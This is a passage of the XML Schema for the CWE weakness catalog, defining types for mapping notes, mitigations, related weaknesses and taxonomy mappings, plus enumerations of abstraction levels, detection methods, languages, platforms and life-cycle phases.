    <xs:element name="Functional_Area" type="cwe:FunctionalAreaEnumeration" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="MappingNotesType">
    <xs:annotation>
    <xs:documentation>The MappingNotesType complex type provides guidance for when (and whether) to map an issue to this CWE entry or to suggest alternatives. The Usage element describes whether the CWE should be used for mapping vulnerabilities to their underlying weaknesses as part of root cause analysis. The Rationale element provides context for the Usage. The Comments element provides further clarification to the reader. The Reasons element uses a limited vocabulary to summarize the Usage. The Suggestions element includes suggestions for additional CWEs that might be more appropriate for the mapping task.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Usage" type="cwe:UsageEnumeration" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Rationale" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Comments" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Reasons" type="cwe:ReasonsType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Suggestions" type="cwe:SuggestionsType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="MemberType">
    <xs:annotation>
    <xs:documentation>The MemberType complex type may be used to establish a Has_Member or Member_Of type relationship within the designated View_ID. This type will establish a relationship between the container Category/View ID and the target CWE_ID.</xs:documentation>
    </xs:annotation>
    <xs:attribute name="CWE_ID" type="xs:integer" use="required"/>
    <xs:attribute name="View_ID" type="xs:integer" use="required"/>
    </xs:complexType>
    <xs:complexType name="ModesOfIntroductionType">
    <xs:annotation>
    <xs:documentation>The ModeOfIntroductionType complex type is used to provide information about how and when a given weakness may be introduced. If there are multiple possible introduction points, then a separate Introduction element should be included for each. The required Phase element identifies the point in the product life cycle at which the weakness may be introduced. The optional Note element identifies the typical scenarios under which the weakness may be introduced during the given phase.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Introduction" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Phase" type="cwe:PhaseEnumeration" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Note" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="NotesType">
    <xs:annotation>
    <xs:documentation>The NotesType complex type contains one or more Note elements, each of which is used to provide any additional comments about an entry that cannot be captured using other elements.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Note" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:complexContent>
    <xs:extension base="cwe:StructuredTextType">
    <xs:attribute name="Type" type="cwe:NoteTypeEnumeration" use="required"/>
    </xs:extension>
    </xs:complexContent>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ObservedExampleType">
    <xs:annotation>
    <xs:documentation>The ObservedExampleType complex type specifies references to a specific observed instance of a weakness in real-world products. Typically this will be a CVE reference. Each Observed_Example element represents a single example. The required Reference element should contain the identifier for the example being cited. For example, if a CVE is being cited, it should be of the standard CVE identifier format, such as CVE-2005-1951 or CVE-1999-0046. The required Description element should contain a brief description of the weakness being cited, without including irrelevant details such as the product name or attack vectors. The description should present an unambiguous correlation between the example being described and the weakness(es) that it is meant to exemplify. It should also be short and easy to understand. The Link element should provide a valid URL where more information regarding this example can be obtained.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Observed_Example" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Reference" type="xs:string" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Description" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Link" type="xs:anyURI" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="PotentialMitigationsType">
    <xs:annotation>
    <xs:documentation>The PotentialMitigationsType complex type is used to describe potential mitigations associated with a weakness. It contains one or more Mitigation elements, which each represent individual mitigations for the weakness. The Phase element indicates the development life cycle phase during which this particular mitigation may be applied. The Strategy element describes a general strategy for protecting a system to which this mitigation contributes. The Effectiveness element summarizes how effective the mitigation may be in preventing the weakness. The Description element contains a description of this individual mitigation including any strengths and shortcomings of this mitigation for the weakness.</xs:documentation>
    <xs:documentation>The optional Mitigation_ID attribute is used by the internal CWE team to uniquely identify mitigations that are repeated across any number of individual weaknesses. To help make sure that the details of these common mitigations stay synchronized, the Mitigation_ID is used to quickly identify those mitigation elements across CWE that should be identical. The identifier is a string and should match the following format: MIT-1.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Mitigation" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Phase" type="cwe:PhaseEnumeration" minOccurs="0" maxOccurs="unbounded"/>
    <xs:element name="Strategy" type="cwe:MitigationStrategyEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Description" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Effectiveness" type="cwe:EffectivenessEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Effectiveness_Notes" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Mitigation_ID" type="xs:string"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ReasonsType">
    <xs:annotation>
    <xs:documentation>The ReasonsType complex type is used to identify the different reasons to why a CWE should not be considered.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Reason" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Type" type="cwe:ReasonEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ReferencesType">
    <xs:annotation>
    <xs:documentation>The ReferencesType complex type contains one or more reference elements, each of which is used to link to an external reference defined within the catalog. The required External_Reference_ID attribute represents the external reference entry being linked to (e.g., REF-1). Text or quotes within the same CWE entity can cite this External_Reference_ID similar to how a footnote is used, and should use the format [REF-1]. The optional Section attribute holds any section title or page number that is specific to this use of the reference.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Reference" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="External_Reference_ID" type="xs:string" use="required"/>
    <xs:attribute name="Section" type="xs:string"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="RelatedAttackPatternsType">
    <xs:annotation>
    <xs:documentation>The RelatedAttackPatternsType complex type contains references to attack patterns associated with this weakness. The association implies those attack patterns may be applicable if an instance of this weakness exists. Each related attack pattern is identified by a CAPEC identifier.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Related_Attack_Pattern" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="CAPEC_ID" type="xs:integer" use="required"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="RelatedWeaknessesType">
    <xs:annotation>
    <xs:documentation>The RelatedWeaknessesType complex type is used to refer to other weaknesses that differ only in their level of abstraction. It contains one or more Related_Weakness elements, each of which is used to link to the CWE identifier of the other Weakness. The nature of the relation is captured by the Nature attribute. Please see the RelatedNatureEnumeration simple type definition for details about the valid value and meanings. The optional Chain_ID attribute specifies the unique ID of a named chain that a CanFollow or CanPrecede relationship pertains to. The optional Ordinal attribute is used to determine if this relationship is the primary ChildOf relationship for this weakness for a given View_ID. This attribute can only have the value "Primary" and should only be included for the primary parent/child relationship. For each unique triple of <Nature, CWE_ID, View_ID>, there should be only one relationship that is given a "Primary" ordinal.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Related_Weakness" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Nature" type="cwe:RelatedNatureEnumeration" use="required"/>
    <xs:attribute name="CWE_ID" type="xs:integer" use="required"/>
    <xs:attribute name="View_ID" type="xs:integer" use="required"/>
    <xs:attribute name="Chain_ID" type="xs:integer"/>
    <xs:attribute name="Ordinal" type="cwe:OrdinalEnumeration"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="RelationshipsType">
    <xs:annotation>
    <xs:documentation>The RelationshipsType complex type provides elements to show the associated relationships with a given view or category. The Member_Of element is used to denote the individual categories that are included as part of the target view. The Has_Member element is used to define the weaknesses or other categories that are grouped together by a category. In both cases, the required MemberType's CWE_ID attribute specifies the unique CWE ID that is the target entry of the relationship, while the View_ID specifies which view the given relationship is relevant to.</xs:documentation>
    </xs:annotation>
    <xs:choice>
    <xs:sequence>
    <xs:element name="Member_Of" type="cwe:MemberType" minOccurs="1" maxOccurs="unbounded"/>
    <xs:element name="Has_Member" type="cwe:MemberType" minOccurs="0" maxOccurs="unbounded"/>
    </xs:sequence>
    <xs:element name="Has_Member" type="cwe:MemberType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:choice>
    </xs:complexType>
    <xs:complexType name="SuggestionsType">
    <xs:annotation>
    <xs:documentation>The SuggestionsType complex type is used to suggest other CWE entries that might be more appropriate to use for mapping.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Suggestion" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="CWE_ID" type="xs:integer" use="required"/>
    <xs:attribute name="Comment" type="xs:string" use="required"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="TaxonomyMappingsType">
    <xs:annotation>
    <xs:documentation>The TaxonomyMappingsType complex type is used to provide a mapping from an entry (Weakness or Category) in CWE to an equivalent entry in a different taxonomy. The required Taxonomy_Name attribute identifies the taxonomy to which the mapping is being made. The Entry_ID and Entry_Name elements identify the ID and name of the entry which is being mapped. The Mapping_Fit element identifies how close the CWE is to the entry in the taxonomy.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Taxonomy_Mapping" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Entry_ID" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Entry_Name" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Mapping_Fit" type="cwe:TaxonomyMappingFitEnumeration" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Taxonomy_Name" type="cwe:TaxonomyNameEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="WeaknessOrdinalitiesType">
    <xs:annotation>
    <xs:documentation>The WeaknessOrdinalitiesType complex type indicates potential ordering relationships with other weaknesses. The required Ordinality element identifies whether the weakness has a primary, resultant, or indirect relationship. The optional Description contains the context in which the relationship exists. It is important to note that it is possible for the same entry to be primary in some instances and resultant in others.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Weakness_Ordinality" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Ordinality" type="cwe:OrdinalityEnumeration" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Description" type="xs:string" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <!--  ===============================================================================  -->
    <!--  ===============================  ENUMERATIONS  ================================  -->
    <!--  ===============================================================================  -->
    <xs:simpleType name="AbstractionEnumeration">
    <xs:annotation>
    <xs:documentation>The AbstractionEnumeration simple type defines the different abstraction levels that apply to a weakness. A "Pillar" is the most abstract type of weakness and represents a theme for all class/base/variant weaknesses related to it. A Pillar is different from a Category as a Pillar is still technically a type of weakness that describes a mistake, while a Category represents a common characteristic used to group related things. A "Class" is a weakness also described in a very abstract fashion, typically independent of any specific language or technology. More specific than a Pillar Weakness, but more general than a Base Weakness. Class level weaknesses typically describe issues in terms of 1 or 2 of the following dimensions: behavior, property, and resource. A "Base" is a more specific type of weakness that is still mostly independent of a resource or technology, but with sufficient details to provide specific methods for detection and prevention. Base level weaknesses typically describe issues in terms of 2 or 3 of the following dimensions: behavior, property, technology, language, and resource. A "Variant" is a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource. A "Compound" weakness is a meaningful aggregation of several weaknesses, currently known as either a Chain or Composite.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Pillar"/>
    <xs:enumeration value="Class"/>
    <xs:enumeration value="Base"/>
    <xs:enumeration value="Variant"/>
    <xs:enumeration value="Compound"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ArchitectureClassEnumeration">
    <xs:annotation>
    <xs:documentation>The ArchitectureClassEnumeration simple type contains a list of values corresponding to known classes of architectures. The value "Not Architecture-Specific" is used to indicate that the entry is not limited to a small set of architectures, i.e., it can appear in many different architectures.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Embedded"/>
    <xs:enumeration value="Microcomputer"/>
    <xs:enumeration value="Workstation"/>
    <xs:enumeration value="Not Architecture-Specific">
    <xs:annotation>
    <xs:documentation>Used to indicate that the entry is not limited to a small set of architectures, i.e., it can appear in many different architectures</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ArchitectureNameEnumeration">
    <xs:annotation>
    <xs:documentation>The ArchitectureNameEnumeration simple type contains a list of values corresponding to known architectures.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Alpha"/>
    <xs:enumeration value="ARM"/>
    <xs:enumeration value="Itanium"/>
    <xs:enumeration value="Power Architecture"/>
    <xs:enumeration value="SPARC"/>
    <xs:enumeration value="x86"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="DetectionMethodEnumeration">
    <xs:annotation>
    <xs:documentation>The DetectionMethodEnumeration simple type defines the different methods used to detect a weakness.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Automated Analysis"/>
    <xs:enumeration value="Automated Dynamic Analysis"/>
    <xs:enumeration value="Automated Static Analysis"/>
    <xs:enumeration value="Automated Static Analysis - Source Code"/>
    <xs:enumeration value="Automated Static Analysis - Binary or Bytecode"/>
    <xs:enumeration value="Fuzzing"/>
    <xs:enumeration value="Manual Analysis"/>
    <xs:enumeration value="Manual Dynamic Analysis"/>
    <xs:enumeration value="Manual Static Analysis"/>
    <xs:enumeration value="Manual Static Analysis - Source Code"/>
    <xs:enumeration value="Manual Static Analysis - Binary or Bytecode"/>
    <xs:enumeration value="White Box"/>
    <xs:enumeration value="Black Box"/>
    <xs:enumeration value="Architecture or Design Review"/>
    <xs:enumeration value="Dynamic Analysis with Manual Results Interpretation"/>
    <xs:enumeration value="Dynamic Analysis with Automated Results Interpretation"/>
    <xs:enumeration value="Formal Verification"/>
    <xs:enumeration value="Simulation / Emulation"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="DetectionEffectivenessEnumeration">
    <xs:annotation>
    <xs:documentation>The DetectionEffectivenessEnumeration simple type defines the different levels of effectiveness that a detection method may have in detecting an associated weakness. The value "High" is used to describe a method that succeeds frequently and does not result in many false reports. The value "Moderate" is used to describe a method that is applicable to multiple circumstances, but it may not have complete coverage of the weakness, or it may result in a number of incorrect reports. The "SOAR Partial" value means that according to SOAR this method can be cost-effective for partial coverage of the objective. The value "Opportunistic" is used to describe a method that does not directly target the weakness but may still succeed by chance, rather than in a reliable manner. The value "Limited" is used to describe a method that may be useful in limited circumstances, only applicable to a subset of potential instances of a given weakness type, requires training/customization, or gives limited visibility. Even in its limited capacity, this may be part of a good defense in depth strategy. The value "None" is used to describe a method that is highly unlikely to work. However, it may be included in an entry to emphasize common, yet incorrect, methods that developers might introduce.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="High"/>
    <xs:enumeration value="Moderate"/>
    <xs:enumeration value="SOAR Partial">
    <xs:annotation>
    <xs:documentation>Used to indicate that according to the IATAC State Of the Art Report (SOAR), the detection method is partially effective.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Opportunistic"/>
    <xs:enumeration value="Limited"/>
    <xs:enumeration value="None"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="EffectivenessEnumeration">
    <xs:annotation>
    <xs:documentation>The EffectivenessEnumeration simple type defines the different values related to how effective a mitigation may be in preventing the weakness. A value of "High" means the mitigation is frequently successful in eliminating the weakness entirely. A value of "Moderate" means the mitigation will prevent the weakness in multiple forms, but it does not have complete coverage of the weakness. A value of "Limited" means the mitigation may be useful in limited circumstances, or it is only applicable to a subset of potential errors of this weakness type. A value of "Incidental" means the mitigation is generally not effective and will only provide protection by chance, rather than in a reliable manner. A value of "Defense in Depth" means the mitigation may not necessarily prevent the weakness, but it may help to minimize the potential impact of an attacker exploiting the weakness. A value of "Discouraged Common Practice" is used to indicate mitigations that are commonly attempted but known to be ineffective or highly risky.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="High"/>
    <xs:enumeration value="Moderate"/>
    <xs:enumeration value="Limited"/>
    <xs:enumeration value="Incidental"/>
    <xs:enumeration value="Discouraged Common Practice"/>
    <xs:enumeration value="Defense in Depth"/>
    <xs:enumeration value="None"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="FunctionalAreaEnumeration">
    <xs:annotation>
    <xs:documentation>The FunctionalAreaEnumeration simple type defines the different functional areas in which the weakness may appear. The value "Functional-Area-Independent" is used to indicate that the entry is not limited to a small set of functional areas, i.e., it can appear in many different functional areas</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Authentication"/>
    <xs:enumeration value="Authorization"/>
    <xs:enumeration value="Code Libraries"/>
    <xs:enumeration value="Counters"/>
    <xs:enumeration value="Cryptography"/>
    <xs:enumeration value="Error Handling"/>
    <xs:enumeration value="Interprocess Communication"/>
    <xs:enumeration value="File Processing"/>
    <xs:enumeration value="Logging"/>
    <xs:enumeration value="Memory Management"/>
    <xs:enumeration value="Networking"/>
    <xs:enumeration value="Number Processing"/>
    <xs:enumeration value="Program Invocation"/>
    <xs:enumeration value="Protection Mechanism"/>
    <xs:enumeration value="Session Management"/>
    <xs:enumeration value="Signals"/>
    <xs:enumeration value="String Processing"/>
    <xs:enumeration value="Not Functional-Area-Specific">
    <xs:annotation>
    <xs:documentation>Used to indicate that the entry is not limited to a small set of functional areas, i.e., it can appear in many different functional areas</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    <xs:enumeration value="Power"/>
    <xs:enumeration value="Clock"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ImportanceEnumeration">
    <xs:annotation>
    <xs:documentation>The ImportanceEnumeration simple type lists different values for importance.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Normal"/>
    <xs:enumeration value="Critical"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="LanguageClassEnumeration">
    <xs:annotation>
    <xs:documentation>The LanguageClassEnumeration simple type contains a list of values corresponding to different classes of source code languages. The value "Not Language-Specific" is used to indicate that the entry is not limited to a small set of languages.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Assembly"/>
    <xs:enumeration value="Compiled"/>
    <xs:enumeration value="Hardware Description Language"/>
    <xs:enumeration value="Interpreted"/>
    <xs:enumeration value="Not Language-Specific">
    <xs:annotation>
    <xs:documentation>Used to indicate that the entry is not limited to a small set of language classes, i.e., it can appear in many different language classes.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="LanguageNameEnumeration">
    <xs:annotation>
    <xs:documentation>The LanguageNameEnumeration simple type contains a list of values corresponding to different source code languages or data formats.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Ada"/>
    <xs:enumeration value="ARM Assembly"/>
    <xs:enumeration value="ASP"/>
    <xs:enumeration value="ASP.NET"/>
    <xs:enumeration value="Basic"/>
    <xs:enumeration value="C"/>
    <xs:enumeration value="C++"/>
    <xs:enumeration value="C#"/>
    <xs:enumeration value="COBOL"/>
    <xs:enumeration value="Fortran"/>
    <xs:enumeration value="F#"/>
    <xs:enumeration value="Go"/>
    <xs:enumeration value="HTML"/>
    <xs:enumeration value="Java"/>
    <xs:enumeration value="JavaScript"/>
    <xs:enumeration value="JSON"/>
    <xs:enumeration value="JSP"/>
    <xs:enumeration value="Objective-C"/>
    <xs:enumeration value="Pascal"/>
    <xs:enumeration value="Perl"/>
    <xs:enumeration value="PHP"/>
    <xs:enumeration value="Pseudocode"/>
    <xs:enumeration value="Python"/>
    <xs:enumeration value="Ruby"/>
    <xs:enumeration value="Rust"/>
    <xs:enumeration value="Shell"/>
    <xs:enumeration value="SQL"/>
    <xs:enumeration value="Swift"/>
    <xs:enumeration value="VB.NET"/>
    <xs:enumeration value="Verilog"/>
    <xs:enumeration value="VHDL"/>
    <xs:enumeration value="XML"/>
    <xs:enumeration value="x86 Assembly"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="LikelihoodEnumeration">
    <xs:annotation>
    <xs:documentation>The LikelihoodEnumeration simple type contains a list of values corresponding to different likelihoods. The value "Unknown" should be used when the actual likelihood of something occurring is not known.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="High"/>
    <xs:enumeration value="Medium"/>
    <xs:enumeration value="Low"/>
    <xs:enumeration value="Unknown"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="MitigationStrategyEnumeration">
    <xs:annotation>
    <xs:documentation>The MitigationStrategyEnumeration simple type lists general strategies for protecting a system to which a mitigation contributes.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Attack Surface Reduction"/>
    <xs:enumeration value="Compilation or Build Hardening"/>
    <xs:enumeration value="Enforcement by Conversion"/>
    <xs:enumeration value="Environment Hardening"/>
    <xs:enumeration value="Firewall"/>
    <xs:enumeration value="Input Validation"/>
    <xs:enumeration value="Language Selection"/>
    <xs:enumeration value="Libraries or Frameworks"/>
    <xs:enumeration value="Resource Limitation"/>
    <xs:enumeration value="Output Encoding"/>
    <xs:enumeration value="Parameterization"/>
    <xs:enumeration value="Refactoring"/>
    <xs:enumeration value="Sandbox or Jail"/>
    <xs:enumeration value="Separation of Privilege"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="NoteTypeEnumeration">
    <xs:annotation>
    <xs:documentation>The NoteTypeEnumeration simple type defines the different types of notes that can be associated with a weakness. An "Applicable Platform" note provides additional information about the list of applicable platforms for a given weakness. A "Maintenance" note contains significant maintenance tasks within this entry that still need to be addressed, such as clarifying the concepts involved or improving relationships. A "Relationship" note provides clarifying details regarding the relationships between entities. A "Research Gap" note identifies potential opportunities for the vulnerability research community to conduct further exploration of issues related to this weakness. It is intended to highlight parts of CWE that have not received sufficient attention from researchers. A "Terminology" note contains a discussion of terminology issues related to this weakness, or clarifications when there is no established terminology, or if there are multiple uses of the same key term. It is different from the Alternate_Terms element, which is focused on specific terms that are commonly used. A "Theoretical" note describes the weakness using vulnerability theory concepts. It should be provided as needed, especially in cases where the application of vulnerability theory is not necessarily obvious for the weakness.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Applicable Platform"/>
    <xs:enumeration value="Maintenance"/>
    <xs:enumeration value="Relationship"/>
    <xs:enumeration value="Research Gap"/>
    <xs:enumeration value="Terminology"/>
    <xs:enumeration value="Theoretical"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="OrdinalEnumeration">
    <xs:annotation>
    <xs:documentation>The OrdinalEnumeration simple type contains a list of values used to determine if a relationship is the primary relationship for a given weakness entry within a given view. Currently, this attribute can only have the value "Primary".</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Primary"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="OrdinalityEnumeration">
    <xs:annotation>
    <xs:documentation>The OrdinalityEnumeration simple type contains a list of values used to indicates potential ordering relationships with other weaknesses. A primary relationship means the weakness exists independent of other weaknesses, while a resultant relationship is when a weakness exists only in the presence of some other weaknesses. An indirect relationship means the weakness does not directly lead to security-relevant weaknesses but is a quality issue that might indirectly make it easier to introduce security-relevant weaknesses or make them more difficult to detect.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Indirect"/>
    <xs:enumeration value="Primary"/>
    <xs:enumeration value="Resultant"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="OperatingSystemClassEnumeration">
    <xs:annotation>
    <xs:documentation>The OperatingSystemClassEnumeration simple type contains a list of values corresponding to different classes of operating systems. The value "Not OS-Specific" is used to indicate that the entry is not limited to a small set of operating system classes, i.e., it can appear in many different operating system classes.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Linux"/>
    <xs:enumeration value="macOS"/>
    <xs:enumeration value="Unix"/>
    <xs:enumeration value="Windows"/>
    <xs:enumeration value="Not OS-Specific">
    <xs:annotation>
    <xs:documentation>Used to indicate that the entry is not limited to a small set of operating system classes, i.e., it can appear in many different operating system classes.</xs:documentation>
    </xs:annotation>
    </xs:enumeration>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="OperatingSystemNameEnumeration">
    <xs:annotation>
    <xs:documentation>The OperatingSystemNameEnumeration simple type contains a list of values corresponding to different operating systems.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="AIX"/>
    <xs:enumeration value="Android"/>
    <xs:enumeration value="BlackBerry OS"/>
    <xs:enumeration value="Chrome OS"/>
    <xs:enumeration value="Darwin"/>
    <xs:enumeration value="FreeBSD"/>
    <xs:enumeration value="iOS"/>
    <xs:enumeration value="macOS"/>
    <xs:enumeration value="NetBSD"/>
    <xs:enumeration value="OpenBSD"/>
    <xs:enumeration value="Red Hat"/>
    <xs:enumeration value="Solaris"/>
    <xs:enumeration value="SUSE"/>
    <xs:enumeration value="tvOS"/>
    <xs:enumeration value="Ubuntu"/>
    <xs:enumeration value="watchOS"/>
    <xs:enumeration value="Windows 9x"/>
    <xs:enumeration value="Windows Embedded"/>
    <xs:enumeration value="Windows NT"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="PhaseEnumeration">
    <xs:annotation>
    <xs:documentation>The PhaseEnumeration simple type lists different phases in the product life cycle.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Policy"/>
    <xs:enumeration value="Requirements"/>
    <xs:enumeration value="Architecture and Design"/>
    <xs:enumeration value="Implementation"/>
    <xs:enumeration value="Build and Compilation"/>
    <xs:enumeration value="Testing"/>
    <xs:enumeration value="Documentation"/>
    <xs:enumeration value="Bundling"/>
    <xs:enumeration value="Distribution"/>
    <xs:enumeration value="Installation"/>
    <xs:enumeration value="System Configuration"/>
    <xs:enumeration value="Operation"/>
    <xs:enumeration value="Patching and Maintenance"/>
    <xs:enumeration value="Porting"/>
    <xs:enumeration value="Integration"/>
    <xs:enumeration value="Manufacturing"/>
    <xs:enumeration value="Decommissioning and End-of-Life"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="PrevalenceEnumeration">
    <xs:annotation>
    <xs:documentation>The PrevalenceEnumeration simple type defines the different regularities that guide the applicability of platforms.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Often"/>
    <xs:enumeration value="Sometimes"/>
    <xs:enumeration value="Rarely"/>
    <xs:enumeration value="Undetermined"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="ReasonEnumeration">
    <xs:annotation>
    <xs:documentation>The ReasonEnumeration simple type holds all the different types of reasons to why a CWE might not be considered for mapping.</xs:documentation>
    </xs:annotation>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Abstraction"/>
    <xs:enumeration value="Category"/>
    <xs:enumeration value="View"/>
    <xs:enumeration value="Deprecated"/>
    <xs:enumeration value="Potential Deprecation"/>
    <xs:enumeration value="Frequent Misuse"/>
    <xs:enumeration value="Frequent Misinterpretation"/>
    <xs:enumeration value="Multiple Use"/>
    <xs:enumeration value="CWE Overlap"/>
    <xs:enumeration value="Acceptable-Use"/>
    <xs:enumeration value="Potential Major Changes"/>
    <xs:enumeration value="Other"/>
    </xs:restriction>
    </xs:simpleType>
    <xs:simpleType name="RelatedNatureEnumeration">
    <xs:annotation>
